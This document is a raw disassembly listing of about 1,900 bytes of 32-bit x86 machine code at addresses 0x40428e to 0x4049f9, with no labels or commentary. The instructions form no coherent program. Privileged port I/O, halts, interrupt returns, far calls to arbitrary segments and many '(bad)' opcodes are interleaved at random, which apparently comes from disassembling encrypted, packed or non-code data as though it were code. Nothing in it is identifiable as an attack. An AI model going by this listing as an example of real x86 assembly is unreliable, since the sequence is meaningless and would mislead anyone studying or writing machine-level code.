  40428e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40428f:	jb     0x4042ad
  404291:	pop    esp
  404292:	jno    0x404261
  404294:	jne    0x40425b
  404296:	sub    eax,DWORD PTR [esi+0x67]
  404299:	imul   esi,DWORD PTR [edx+0x6292e083],0x55
  4042a0:	rol    BYTE PTR [eax],cl
  4042a2:	xchg   edx,eax
  4042a3:	and    BYTE PTR [ebx+0x77c3a50c],dh
  4042a9:	jp     0x404312
  4042ab:	lea    eax,[edi-0x2b]
  4042ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042af:	lea    edx,[esp]
  4042b2:	test   eax,0x99debf2c
  4042b7:	mov    fs,WORD PTR [ecx]
  4042b9:	inc    esi
  4042ba:	fs pop es
  4042bc:	xchg   DWORD PTR [edx-0x55],esi
  4042bf:	stos   DWORD PTR es:[edi],eax
  4042c0:	mov    eax,ds:0x552458ce
  4042c5:	jae    0x4042fb
  4042c7:	jle    0x404260
  4042c9:	pushf  
  4042ca:	lahf   
  4042cb:	jg     0x404285
  4042cd:	jno    0x4042ef
  4042cf:	rol    DWORD PTR [eax+0x4c7a84fd],1
  4042d5:	fwait
  4042d6:	into   
  4042d7:	icebp  
  4042d8:	frstor [edx+ebp*2-0xa]
  4042dc:	jp     0x4042ba
  4042de:	test   al,0x4e
  4042e0:	jp     0x40435c
  4042e2:	cdq    
  4042e3:	adc    edi,eax
  4042e5:	loop   0x4042a2
  4042e7:	stos   BYTE PTR es:[edi],al
  4042e8:	push   0xffffffad
  4042ea:	ss jbe 0x404328
  4042ed:	mov    ds:0x27eebef3,eax
  4042f2:	jmp    0x40431e
  4042f4:	sub    al,BYTE PTR [esi]
  4042f6:	jns    0x40436f
  4042f8:	cmp    ah,dl
  4042fa:	cmp    al,0x11
  4042fc:	inc    ecx
  4042fd:	fxch   st(2)
  4042ff:	inc    ebx
  404300:	in     eax,dx
  404301:	iret   
  404302:	dec    edi
  404303:	ds dec edx
  404305:	call   0xe166:0x74cd6288
  40430c:	out    0x1b,al
  40430e:	out    dx,al
  40430f:	pop    ebp
  404310:	pop    es
  404311:	scas   al,BYTE PTR es:[edi]
  404312:	cmp    BYTE PTR [esi-0x2e91db],bh
  404318:	pop    ss
  404319:	sub    BYTE PTR [edi+ebp*2+0x16],dl
  40431d:	out    dx,eax
  40431e:	fsubr  QWORD PTR [edi]
  404320:	frstor fs:[edi]
  404323:	jno    0x404326
  404325:	rdtsc  
  404327:	ss into 
  404329:	neg    BYTE PTR [ebp+0x9]
  40432c:	sbb    al,0xa8
  40432e:	sahf   
  40432f:	clc    
  404330:	mov    bh,0xab
  404332:	push   edi
  404333:	xor    eax,0xaeda1812
  404338:	arpl   WORD PTR [ecx],di
  40433a:	lea    esi,[eax+0x1c]
  40433d:	sub    edx,ebp
  40433f:	sar    DWORD PTR [ebx],1
  404341:	nop
  404342:	stos   BYTE PTR es:[edi],al
  404343:	mov    cl,0xd5
  404345:	xor    ebx,DWORD PTR [esi+0x30a6439f]
  40434b:	addr16 (bad) 
  40434e:	mov    ds:0x7144b8d8,eax
  404353:	jg     0x404388
  404355:	and    cl,ch
  404357:	mov    ds:0x9ce3386f,al
  40435c:	in     al,0xf7
  40435e:	jmp    0x907c9ce8
  404363:	mov    bh,0x44
  404365:	out    0x25,eax
  404367:	das    
  404368:	lods   al,BYTE PTR ds:[esi]
  404369:	mov    ds:0x4f296ac3,al
  40436e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40436f:	gs ja  0x40438f
  404372:	xchg   esi,eax
  404373:	sbb    DWORD PTR [ebp-0x5d],ebp
  404376:	retf   0xfcc7
  404379:	hlt    
  40437a:	out    0x36,eax
  40437c:	std    
  40437d:	neg    BYTE PTR [ecx+0x47]
  404380:	add    al,0xd7
  404382:	mov    ebp,0x97ade6b8
  404387:	ins    DWORD PTR es:[edi],dx
  404388:	mov    dl,0x5b
  40438a:	pop    ecx
  40438b:	scas   eax,DWORD PTR es:[edi]
  40438c:	paddb  mm5,mm1
  40438f:	lods   eax,DWORD PTR ds:[esi]
  404390:	lahf   
  404391:	iret   
  404392:	cmp    al,0xe8
  404394:	bound  edx,QWORD PTR [esp+edx*8]
  404397:	adc    bl,BYTE PTR [edi-0xa58fad4]
  40439d:	jae    0x40439e
  40439f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043a1:	jecxz  0x4043cd
  4043a3:	mov    BYTE PTR [ecx-0x679cdf32],al
  4043a9:	cmp    al,0xab
  4043ab:	adc    ch,BYTE PTR [ebx]
  4043ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043ae:	outs   dx,DWORD PTR ds:[esi]
  4043af:	push   0xffffffcb
  4043b1:	jecxz  0x4043d2
  4043b3:	inc    BYTE PTR [ebx]
  4043b5:	nop
  4043b6:	clc    
  4043b7:	jo     0x40442d
  4043b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043ba:	loope  0x404353
  4043bc:	aam    0x13
  4043be:	fs push ecx
  4043c0:	into   
  4043c1:	mov    ch,0x1a
  4043c3:	int3   
  4043c4:	xor    al,0xc7
  4043c6:	in     eax,0x43
  4043c8:	rcl    DWORD PTR [ebp+0x4a],cl
  4043cb:	add    BYTE PTR [esi],ah
  4043cd:	fstp   TBYTE PTR ds:0x1f82f0a7
  4043d3:	mov    bl,0xf9
  4043d5:	stos   BYTE PTR es:[edi],al
  4043d6:	daa    
  4043d7:	xor    bh,bl
  4043d9:	add    eax,0x38cf1c3b
  4043de:	mov    esi,edx
  4043e0:	fimul  DWORD PTR [eax+edx*1]
  4043e3:	fdivr  QWORD PTR ds:0x6b3cd441
  4043e9:	xor    BYTE PTR [ebx],al
  4043eb:	xor    al,0xc2
  4043ed:	fld    QWORD PTR [esp+esi*1-0x30eec03f]
  4043f4:	or     DWORD PTR [eax+0x6f9d87],eax
  4043fa:	ret    
  4043fb:	mov    DWORD PTR [esp+ebx*1],esi
  4043fe:	dec    ecx
  4043ff:	push   ebp
  404400:	add    DWORD PTR [eax-0x311158d8],ecx
  404406:	jl     0x4043a8
  404408:	fmul   QWORD PTR [eax]
  40440a:	mov    ebx,0x790354a7
  40440f:	inc    esi
  404410:	inc    ebx
  404411:	jecxz  0x404453
  404413:	jmp    0x4043af
  404415:	adc    al,0x1f
  404417:	mov    esp,0xdf3029e0
  40441c:	iret   
  40441d:	test   al,0xac
  40441f:	cmc    
  404420:	mov    ebx,0x81308e30
  404425:	sub    edi,DWORD PTR [edi-0x58]
  404428:	inc    ecx
  404429:	call   0x1b97:0xbe0d7ac
  404430:	(bad)  
  404431:	in     eax,0x47
  404433:	fs popf 
  404435:	cmp    dl,bh
  404437:	xchg   DWORD PTR [edx+0x4c16bbe1],ebx
  40443d:	sahf   
  40443e:	scas   eax,DWORD PTR es:[edi]
  40443f:	jae    0x4043e1
  404441:	lahf   
  404442:	cld    
  404443:	sahf   
  404444:	mov    dh,0x2a
  404446:	jbe    0x40447a
  404448:	inc    esi
  404449:	sbb    ebp,edx
  40444b:	aas    
  40444c:	pop    ds
  40444d:	popf   
  40444e:	jno    0x40444b
  404450:	and    al,BYTE PTR [ebx-0x6f54f5b6]
  404456:	sub    esi,DWORD PTR ds:0x57342f33
  40445c:	jnp    0x40441a
  40445e:	pop    ebx
  40445f:	xor    al,0x8c
  404461:	pop    edi
  404462:	jle    0x4044d8
  404464:	popf   
  404465:	add    eax,0xec0a8a97
  40446a:	dec    ecx
  40446b:	cdq    
  40446c:	fsubr  st,st(5)
  40446e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40446f:	xlat   BYTE PTR ds:[ebx]
  404470:	mov    dh,0x19
  404472:	push   ds
  404473:	(bad)  
  404474:	cmp    DWORD PTR [edi],edi
  404476:	jns    0x40447f
  404478:	aaa    
  404479:	cmc    
  40447a:	pop    ss
  40447b:	sbb    dl,BYTE PTR [ebp+0x1f]
  40447e:	push   ds
  40447f:	jo     0x404464
  404481:	push   cs
  404482:	dec    ebp
  404483:	ins    DWORD PTR es:[edi],dx
  404484:	cmp    DWORD PTR [edx+edx*2-0x52ba450a],ebp
  40448b:	jle    0x404415
  40448d:	lods   al,BYTE PTR ds:[esi]
  40448e:	scas   al,BYTE PTR es:[edi]
  40448f:	mov    ch,0x21
  404491:	pop    eax
  404492:	inc    esp
  404493:	fdiv   DWORD PTR [ebx+0x2ef5e0b3]
  404499:	adc    ebx,DWORD PTR [ecx-0x72]
  40449c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40449d:	mov    ebx,0x9d765a5e
  4044a2:	gs jbe 0x4044dc
  4044a5:	pop    ecx
  4044a6:	dec    ecx
  4044a7:	test   DWORD PTR [edx-0x71],ebx
  4044aa:	jns    0x40449f
  4044ac:	les    edi,FWORD PTR [edx+0x34]
  4044af:	fwait
  4044b0:	iret   
  4044b1:	ret    
  4044b2:	neg    DWORD PTR [edi]
  4044b4:	push   eax
  4044b5:	cli    
  4044b6:	dec    ecx
  4044b7:	jp     0x4044d6
  4044b9:	jecxz  0x40451c
  4044bb:	loop   0x4044e5
  4044bd:	jp     0x404469
  4044bf:	and    eax,0xcca7e683
  4044c4:	shl    DWORD PTR [eax+0x49],cl
  4044c7:	lds    ebp,FWORD PTR [edi-0x24]
  4044ca:	xchg   edi,eax
  4044cb:	jp     0x404493
  4044cd:	adc    BYTE PTR [ebx+0x1936c500],0x82
  4044d4:	mov    eax,0x7e609e7c
  4044d9:	lods   eax,DWORD PTR ds:[esi]
  4044da:	fcomp  QWORD PTR [ecx]
  4044dc:	(bad)  
  4044dd:	int3   
  4044de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044df:	cmp    al,0x1f
  4044e1:	(bad)  
  4044e2:	cmp    al,0x1c
  4044e4:	jge    0x40446b
  4044e6:	and    al,0xf9
  4044e8:	and    al,0x3c
  4044ea:	pop    ecx
  4044eb:	outs   dx,BYTE PTR ds:[esi]
  4044ec:	jnp    0x4044da
  4044ee:	aam    0xe5
  4044f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044f1:	arpl   WORD PTR [eax+0x51],di
  4044f4:	aad    0x0
  4044f6:	and    bh,dh
  4044f8:	popa   
  4044f9:	lods   eax,DWORD PTR ds:[esi]
  4044fa:	mov    ds:0x7b35f021,al
  4044ff:	imul   eax,DWORD PTR [esi],0xfd07fde4
  404505:	out    dx,al
  404506:	out    0x95,eax
  404508:	cmc    
  404509:	ret    
  40450a:	xor    DWORD PTR [ebp+0x530e0c83],eax
  404510:	cld    
  404511:	sbb    DWORD PTR [ecx+0x542b10a4],ecx
  404517:	sbb    eax,0xf80d6ce4
  40451c:	adc    DWORD PTR [ebx+eax*8+0x5c],0x188917e3
  404524:	or     DWORD PTR [edi+0x7d1d9213],ebp
  40452a:	mov    dl,0x13
  40452c:	and    ebp,DWORD PTR [edi-0x33]
  40452f:	pop    esi
  404530:	addr16 sti 
  404532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404533:	mov    ebx,0x567923f1
  404538:	test   eax,edx
  40453a:	adc    ebx,esi
  40453c:	jb     0x4044f2
  40453e:	mov    ebp,DWORD PTR [eax]
  404540:	xlat   BYTE PTR ds:[ebx]
  404541:	imul   eax,DWORD PTR [ecx-0x52422b68],0xd2f0ac9e
  40454b:	jmp    0x40454a
  40454d:	adc    esp,DWORD PTR [ecx]
  40454f:	cli    
  404550:	mov    ebp,0x79c8c9b9
  404555:	mov    ds,WORD PTR [ebx]
  404557:	fnsave [esi]
  404559:	sub    BYTE PTR [ebx],dh
  40455b:	dec    ebp
  40455c:	inc    eax
  40455d:	je     0x404571
  40455f:	or     cl,bl
  404561:	pop    ebx
  404562:	or     ah,BYTE PTR [eax-0x7ce01e]
  404568:	mov    BYTE PTR ds:0x3c6c9886,cl
  40456e:	mov    DWORD PTR [edx-0x18d37091],eax
  404574:	sbb    DWORD PTR [edx],ebx
  404576:	mov    al,0x0
  404578:	imul   DWORD PTR [ecx+0x7a6bf45e]
  40457e:	(bad)  
  40457f:	dec    esi
  404580:	lods   eax,DWORD PTR ds:[esi]
  404581:	jge    0x40456f
  404583:	mov    eax,ds:0x9393f8a2
  404588:	jmp    0x4045f7
  40458a:	pop    esi
  40458b:	outs   dx,DWORD PTR ds:[esi]
  40458c:	or     DWORD PTR [ebx+esi*4+0x5efb7ee3],0xffffff87
  404594:	in     al,0xa5
  404596:	push   ss
  404597:	inc    ecx
  404598:	test   edi,esi
  40459a:	cdq    
  40459b:	dec    edx
  40459c:	pop    edx
  40459d:	lods   al,BYTE PTR ds:[esi]
  40459e:	mul    DWORD PTR [esp+edx*4+0x0]
  4045a2:	sbb    ebp,DWORD PTR [ebx-0x541dc971]
  4045a8:	ja     0x404623
  4045aa:	test   eax,0xbb1f19cd
  4045af:	pop    ebp
  4045b0:	fstp   TBYTE PTR [ecx]
  4045b2:	cdq    
  4045b3:	jns    0x4045fc
  4045b5:	popa   
  4045b6:	dec    edx
  4045b7:	push   esp
  4045b8:	adc    al,0xc9
  4045ba:	sbb    al,cl
  4045bc:	pop    ebp
  4045bd:	adc    BYTE PTR [ecx+0x37],dl
  4045c0:	popf   
  4045c1:	xor    DWORD PTR [edi],edi
  4045c3:	ja     0x4045d4
  4045c5:	rcl    ecx,cl
  4045c7:	data16 xor ah,BYTE PTR [eax]
  4045ca:	(bad)  
  4045cb:	mov    ebp,0x33d1826
  4045d0:	imul   esp,DWORD PTR [esp+esi*4],0x47387893
  4045d7:	pushf  
  4045d8:	pop    edx
  4045d9:	inc    ebx
  4045da:	mov    DWORD PTR [edi-0x4e2d2062],0xc08803fe
  4045e4:	scas   eax,DWORD PTR es:[edi]
  4045e5:	(bad)  
  4045e7:	sub    BYTE PTR [eax+0x47],dl
  4045ea:	fisttp WORD PTR [ecx]
  4045ec:	mov    bh,0xc8
  4045ee:	repnz ins DWORD PTR es:[edi],dx
  4045f0:	and    DWORD PTR [edi],ecx
  4045f2:	(bad)  
  4045f3:	lods   al,BYTE PTR ds:[esi]
  4045f4:	lods   eax,DWORD PTR ds:[esi]
  4045f5:	xor    dl,BYTE PTR [esi]
  4045f7:	adc    BYTE PTR [eiz*8-0x7e33c912],dl
  4045fe:	outs   dx,BYTE PTR ds:[esi]
  4045ff:	pop    ebx
  404600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404601:	sub    BYTE PTR [ebp-0x2e],al
  404604:	jnp    0x4045d8
  404606:	idiv   DWORD PTR [eax-0x3b]
  404609:	cmp    BYTE PTR [ebp+0x154cc720],dl
  40460f:	sbb    al,0x32
  404611:	push   0xadda8afd
  404616:	pop    edx
  404617:	sbb    edi,DWORD PTR [ebx]
  404619:	test   DWORD PTR [ebp+ecx*8+0x3e099ed5],0x9101a937
  404624:	std    
  404625:	sbb    dh,dh
  404627:	cld    
  404628:	mov    esi,0xfe06dc24
  40462d:	or     eax,0xd91333cf
  404632:	lahf   
  404633:	inc    ebx
  404634:	dec    esp
  404635:	jno    0x40461d
  404637:	dec    esi
  404638:	addr16 dec ecx
  40463a:	cdq    
  40463b:	adc    DWORD PTR [esi],0x26
  40463e:	(bad)  
  40463f:	mov    ecx,0x7fdb2cc2
  404644:	push   ds
  404645:	and    bh,0x1b
  404648:	xor    ch,ch
  40464a:	mov    eax,ds:0xae4f9c47
  40464f:	neg    BYTE PTR [edi-0x7a187918]
  404655:	pop    esi
  404656:	cwde   
  404657:	inc    esp
  404658:	fisubr DWORD PTR [esi-0x11]
  40465b:	mov    ah,0x37
  40465d:	pushf  
  40465e:	sbb    eax,0x4319e092
  404663:	mov    dl,0x3d
  404665:	lods   al,BYTE PTR ds:[esi]
  404666:	push   esi
  404667:	and    ch,0x73
  40466a:	pop    eax
  40466b:	int    0xa7
  40466d:	sbb    DWORD PTR [eax-0x25],esi
  404670:	add    BYTE PTR [esi],dl
  404672:	mov    al,0xc6
  404674:	push   esp
  404675:	add    DWORD PTR [edx+0x1e],eax
  404678:	inc    ecx
  404679:	mov    ebp,DWORD PTR gs:[edx+0x4d]
  40467d:	cmp    al,0x42
  40467f:	pop    esi
  404680:	xor    esp,DWORD PTR [eax]
  404682:	lea    esi,[edi+0x70]
  404685:	mov    ebx,0xe296efa1
  40468a:	xchg   DWORD PTR [si-0x280c],eax
  40468f:	inc    ebx
  404690:	or     DWORD PTR [edx+eax*2+0x733f5d4c],edx
  404697:	sub    eax,DWORD PTR [ebx-0x7f]
  40469a:	pushf  
  40469b:	rcr    esi,0x5
  40469e:	cmp    BYTE PTR [eax+0x10],dh
  4046a1:	dec    eax
  4046a2:	lods   al,BYTE PTR ds:[esi]
  4046a3:	iret   
  4046a4:	dec    esi
  4046a5:	(bad)  
  4046a6:	ins    DWORD PTR es:[edi],dx
  4046a7:	pop    DWORD PTR [ecx+0x17]
  4046aa:	mov    eax,0x10e695ac
  4046af:	sub    BYTE PTR [ecx+0x30],dh
  4046b2:	popf   
  4046b3:	sbb    DWORD PTR [esi+ecx*8+0x43eee961],esp
  4046ba:	push   es
  4046bb:	scas   eax,DWORD PTR es:[edi]
  4046bc:	pop    ss
  4046bd:	mov    ebp,DWORD PTR [ebp+eiz*4+0x6c69fc2f]
  4046c4:	inc    BYTE PTR ds:0x7a830da6
  4046ca:	inc    edi
  4046cb:	outs   dx,BYTE PTR ds:[esi]
  4046cc:	xchg   BYTE PTR [ecx-0x47],al
  4046cf:	inc    edx
  4046d0:	xor    DWORD PTR [edx],ecx
  4046d2:	shl    BYTE PTR [edx],cl
  4046d4:	popf   
  4046d5:	mov    esi,0xc24bb44d
  4046da:	add    esi,edi
  4046dc:	std    
  4046dd:	sbb    dh,BYTE PTR [ebp-0x37efea69]
  4046e3:	shr    BYTE PTR [esi-0x6b],1
  4046e6:	add    ebp,DWORD PTR [esi]
  4046e8:	dec    eax
  4046e9:	ror    DWORD PTR [esp+ebx*2-0x1e],1
  4046ed:	shr    BYTE PTR [eax-0x316d347b],0x2f
  4046f4:	fstp   TBYTE PTR [ebp+0x50]
  4046f7:	jl     0x404744
  4046f9:	xchg   esi,eax
  4046fa:	sbb    al,BYTE PTR [edi-0x17]
  4046fd:	icebp  
  4046fe:	jge    0x4046ff
  404700:	inc    esp
  404701:	lahf   
  404702:	(bad)  
  404703:	call   0x11020127
  404708:	sbb    BYTE PTR [ecx+0x772964d8],al
  40470e:	mov    dl,BYTE PTR [edi-0x7a102ed6]
  404714:	dec    edx
  404715:	and    ebp,DWORD PTR [edi]
  404717:	out    dx,al
  404718:	scas   eax,DWORD PTR es:[edi]
  404719:	sub    bh,bh
  40471b:	xlat   BYTE PTR ds:[ebx]
  40471c:	lods   eax,DWORD PTR ds:[esi]
  40471d:	mov    ds:0x48f0ad4f,eax
  404722:	ret    
  404723:	ror    BYTE PTR [eax+eax*8],1
  404726:	lahf   
  404727:	ja     0x40477d
  404729:	fucom  st(2)
  40472b:	shl    BYTE PTR [edx+0x54],0x3c
  40472f:	add    eax,0x3e015dd8
  404734:	(bad)  
  404735:	aam    0xdb
  404737:	jo     0x404708
  404739:	xor    dh,BYTE PTR [ebp+0x23e37b5d]
  40473f:	add    eax,0x6bf073b5
  404744:	stc    
  404745:	stc    
  404746:	outs   dx,DWORD PTR ds:[esi]
  404747:	pop    ecx
  404748:	dec    esp
  404749:	imul   ebx,DWORD PTR [edx+0x7db291b7],0x33
  404750:	mov    ds:0x9eb3dec8,al
  404755:	mov    bh,0xcf
  404757:	cmp    BYTE PTR [edi+0x2],bh
  40475a:	test   BYTE PTR [ebp-0x41f01671],al
  404760:	inc    DWORD PTR [edx]
  404762:	add    DWORD PTR [ecx+0x199a5729],0xffffffb3
  404769:	dec    ecx
  40476a:	cwde   
  40476b:	mov    dl,BYTE PTR [ebx-0x4e]
  40476e:	mov    esi,0xc5a0d351
  404773:	lea    edi,[edx]
  404775:	or     dl,BYTE PTR [eax+0x7cec8d02]
  40477b:	jmp    FWORD PTR [esi]
  40477d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40477e:	bound  esi,QWORD PTR [ebp-0x72]
  404781:	push   esp
  404782:	fcom   QWORD PTR [esi-0x20]
  404785:	and    edi,edx
  404787:	clc    
  404788:	in     eax,dx
  404789:	adc    bh,BYTE PTR [edi]
  40478b:	pusha  
  40478c:	mov    ecx,DWORD PTR [eax]
  40478e:	scas   eax,DWORD PTR es:[edi]
  40478f:	inc    esp
  404790:	mov    bl,0xb0
  404792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404793:	push   es
  404794:	sub    eax,0xc72c19ae
  404799:	lea    ebx,[ecx+0x51741e6e]
  40479f:	imul   eax,DWORD PTR [edi+ebp*1+0x15],0xffffffee
  4047a4:	iret   
  4047a5:	and    BYTE PTR [ecx],bl
  4047a7:	push   ss
  4047a8:	jl     0x4047a7
  4047aa:	jl     0x404780
  4047ac:	xor    ch,ah
  4047ae:	lods   al,BYTE PTR ds:[esi]
  4047af:	outs   dx,BYTE PTR ds:[esi]
  4047b0:	arpl   bx,di
  4047b2:	sub    al,0x31
  4047b4:	xor    edx,esi
  4047b6:	push   es
  4047b7:	shr    esi,cl
  4047b9:	stos   DWORD PTR es:[edi],eax
  4047ba:	icebp  
  4047bb:	cli    
  4047bc:	and    ecx,DWORD PTR [edx-0xfbaef44]
  4047c2:	icebp  
  4047c3:	jne    0x40479c
  4047c5:	stos   BYTE PTR es:[edi],al
  4047c6:	add    al,0x19
  4047c8:	aas    
  4047c9:	lods   al,BYTE PTR ds:[esi]
  4047ca:	inc    edx
  4047cb:	or     DWORD PTR [ecx+0x673d72d6],ecx
  4047d1:	inc    ecx
  4047d2:	adc    al,0xa2
  4047d4:	test   BYTE PTR [ebp+esi*4-0x4422f287],dh
  4047db:	mov    dh,0x79
  4047dd:	retf   
  4047de:	imul   eax
  4047e0:	outs   dx,DWORD PTR ds:[esi]
  4047e1:	or     DWORD PTR [ebx-0x4],ebp
  4047e4:	sar    BYTE PTR ds:0xb5ff4689,0x10
  4047eb:	dec    ebx
  4047ec:	pusha  
  4047ed:	cwde   
  4047ee:	pop    eax
  4047ef:	retf   
  4047f0:	out    0xab,eax
  4047f2:	(bad)  
  4047f4:	test   DWORD PTR [esi+eiz*2+0x7e],ebx
  4047f8:	sub    DWORD PTR [ebp+0x2c4f62f1],ebx
  4047fe:	xor    ch,BYTE PTR [esi+0x25]
  404801:	mov    edx,0x53264adf
  404806:	ja     0x40484f
  404808:	adc    DWORD PTR ds:0xb7cf09ff,edx
  40480e:	enter  0x67a6,0xcc
  404812:	adc    eax,0x780475e5
  404817:	int3   
  404818:	jmp    0xf0c96146
  40481d:	adc    BYTE PTR [ebp+ebp*2+0x543204ac],bh
  404824:	fadd   QWORD PTR [eax+0xa]
  404827:	in     eax,dx
  404828:	shl    DWORD PTR ds:0x4b3c9175,0xc8
  40482f:	and    dl,BYTE PTR [esi]
  404831:	add    BYTE PTR [ecx],dh
  404833:	nop
  404834:	push   cs
  404835:	popf   
  404836:	pushf  
  404837:	mov    DWORD PTR [ecx+0x3f],esi
  40483a:	adc    BYTE PTR ds:0x5ae5b018,0x78
  404841:	into   
  404842:	adc    ebx,esp
  404844:	sub    eax,0x3b6fae64
  404849:	nop    ebp
  40484c:	or     edi,DWORD PTR [ebx+0x757b23e2]
  404852:	mov    esi,0xa8275128
  404857:	loopne 0x4048cd
  404859:	inc    ebx
  40485a:	mov    ebp,0xc6e48a77
  40485f:	adc    eax,0xf55826ff
  404864:	mov    ch,0x65
  404866:	adc    BYTE PTR [ebp+0xe],bl
  404869:	sbb    ch,BYTE PTR [edx+0x70]
  40486c:	xor    eax,edx
  40486e:	or     ecx,0xdc1dd307
  404874:	arpl   WORD PTR [edx],bp
  404876:	mov    cl,0x9c
  404878:	pusha  
  404879:	mov    eax,0xf41ff969
  40487e:	push   edx
  40487f:	mov    bl,0xe1
  404881:	jns    0x40484e
  404883:	adc    DWORD PTR [ebx+0x29],esi
  404886:	xchg   ecx,eax
  404887:	loop   0x40482c
  404889:	xor    al,0x35
  40488b:	mov    ecx,es
  40488d:	mov    cl,0x70
  40488f:	mov    ebx,0x7900c0fc
  404894:	xchg   edi,eax
  404895:	and    ebp,DWORD PTR [esi-0x225df895]
  40489b:	sub    DWORD PTR [eax],ebp
  40489d:	arpl   WORD PTR [ebx+0x40],di
  4048a0:	loopne 0x404918
  4048a2:	btr    ecx,eax
  4048a5:	push   esp
  4048a6:	cmp    al,0xb1
  4048a8:	cli    
  4048a9:	aam    0xde
  4048ab:	jge    0x404896
  4048ad:	xchg   ecx,eax
  4048ae:	fwait
  4048af:	inc    ebx
  4048b0:	or     al,0x5a
  4048b2:	test   eax,eax
  4048b4:	xor    BYTE PTR [ecx],ch
  4048b6:	test   eax,0xfe52b533
  4048bb:	jbe    0x404906
  4048bd:	ret    0x3189
  4048c0:	inc    esi
  4048c1:	leave  
  4048c2:	lock cli 
  4048c4:	dec    ebp
  4048c5:	mov    DWORD PTR [ebp+0x10b73b3],esp
  4048cb:	inc    edi
  4048cc:	shr    BYTE PTR [ebx],1
  4048ce:	and    eax,DWORD PTR [ecx]
  4048d0:	push   eax
  4048d1:	out    dx,eax
  4048d2:	dec    eax
  4048d3:	xchg   ebx,eax
  4048d4:	sahf   
  4048d5:	data16 and bh,dh
  4048d8:	add    eax,0xb5d4a321
  4048dd:	in     eax,0xb8
  4048df:	inc    ebp
  4048e0:	jmp    0x404933
  4048e2:	je     0x40494e
  4048e4:	xchg   edx,eax
  4048e5:	stos   DWORD PTR es:[edi],eax
  4048e6:	mov    esp,0x1768ecdc
  4048eb:	popa   
  4048ec:	and    BYTE PTR [eax-0x40],dl
  4048ef:	sahf   
  4048f0:	dec    ebp
  4048f1:	inc    ecx
  4048f2:	int    0xcd
  4048f4:	adc    bh,BYTE PTR [ebx-0x5ea9e4a2]
  4048fa:	lea    ecx,[ebp+0x2]
  4048fd:	cmp    DWORD PTR [edx-0x69],ebx
  404900:	nop
  404901:	aaa    
  404902:	mov    bl,0x5e
  404904:	sti    
  404905:	repnz mov bh,0xa3
  404908:	jmp    0x4048a0
  40490a:	lods   eax,DWORD PTR ds:[esi]
  40490b:	dec    edx
  40490c:	mov    cl,0x81
  40490e:	mov    edi,0xced9f75b
  404913:	cmp    al,0x6a
  404915:	(bad)  [esp+edx*2-0x3131c747]
  40491c:	enter  0x3e38,0x54
  404920:	xchg   BYTE PTR [edx-0x37],al
  404923:	push   cs
  404924:	outs   dx,DWORD PTR fs:[esi]
  404926:	stos   DWORD PTR es:[edi],eax
  404927:	sbb    ah,BYTE PTR [edi]
  404929:	fnstenv [edi]
  40492b:	push   ebx
  40492c:	inc    esi
  40492d:	fsub   st,st(4)
  40492f:	outs   dx,DWORD PTR ds:[esi]
  404930:	mov    eax,ds:0x25b0dd34
  404935:	test   eax,0x2c8254f
  40493a:	into   
  40493b:	sub    bh,BYTE PTR [ebx]
  40493d:	jnp    0x404950
  40493f:	push   cs
  404940:	pop    edx
  404941:	rcl    ecx,1
  404943:	jp     0x404915
  404945:	aaa    
  404946:	mov    ds:0x7451476f,eax
  40494b:	adc    eax,0xfeef7768
  404950:	jnp    0x4048e5
  404952:	cmp    eax,0xec14fa7
  404957:	dec    eax
  404958:	or     BYTE PTR [eax-0x22be12b7],cl
  40495e:	retf   0x4cde
  404961:	xchg   BYTE PTR [esi+0x22],bh
  404964:	xchg   ecx,eax
  404965:	adc    eax,DWORD PTR [ebx]
  404967:	xchg   ebx,eax
  404968:	adc    BYTE PTR [esi+0x7],0xed
  40496c:	mov    WORD PTR [ecx],?
  40496e:	jne    0x4049ea
  404970:	sbb    BYTE PTR ds:0xac440d8f,bh
  404976:	out    dx,eax
  404977:	inc    eax
  404978:	mov    dl,0xfa
  40497a:	and    BYTE PTR [edi+ecx*1+0x39a9dc79],bh
  404981:	dec    ebp
  404982:	cmp    ah,dl
  404984:	lods   eax,DWORD PTR ss:[esi]
  404986:	imul   ebp,DWORD PTR [edi-0x6c],0xffffffc2
  40498a:	xchg   ecx,eax
  40498b:	or     eax,DWORD PTR ds:0x7b791b49
  404991:	repnz adc eax,0xe664f643
  404997:	leave  
  404998:	js     0x4049d0
  40499a:	je     0x40499e
  40499c:	dec    esi
  40499d:	ss pop edi
  40499f:	xchg   esi,eax
  4049a0:	mov    ds:0x2683c749,al
  4049a5:	push   0xb415b826
  4049aa:	or     ecx,DWORD PTR [edi]
  4049ac:	loop   0x404a04
  4049ae:	iret   
  4049af:	add    dh,BYTE PTR [ebp+0x194d5301]
  4049b5:	cs xchg sp,ax
  4049b8:	dec    ecx
  4049b9:	test   DWORD PTR [esi+0x4f28c031],ecx
  4049bf:	and    DWORD PTR [eax-0x1],edi
  4049c2:	mov    WORD PTR [eax+0x56],ds
  4049c5:	add    cl,BYTE PTR [ebx]
  4049c7:	jmp    FWORD PTR [edi]
  4049c9:	or     ebp,DWORD PTR [ebx+0x59]
  4049cc:	iret   
  4049cd:	jecxz  0x4049e9
  4049cf:	ins    BYTE PTR es:[edi],dx
  4049d0:	fsubr  st,st(7)
  4049d2:	popf   
  4049d3:	mov    ecx,0x470f8f80
  4049d8:	mov    ecx,0x1c07429e
  4049dd:	outs   dx,BYTE PTR ds:[esi]
  4049de:	jno    0x404a45
  4049e0:	jg     0x404a4d
  4049e2:	pop    es
  4049e3:	adc    ebx,DWORD PTR [eax-0x70bf69a2]
  4049e9:	jmp    0x4049d6
  4049eb:	jns    0x4049b7
  4049ed:	in     eax,0x77
  4049ef:	mov    esp,0xf1de45be
  4049f4:	clc    
  4049f5:	ja     0x4049b9
  4049f7:	loopne 0x404a15
  4049f9:	cmp    BYTE PTR [eax],dl
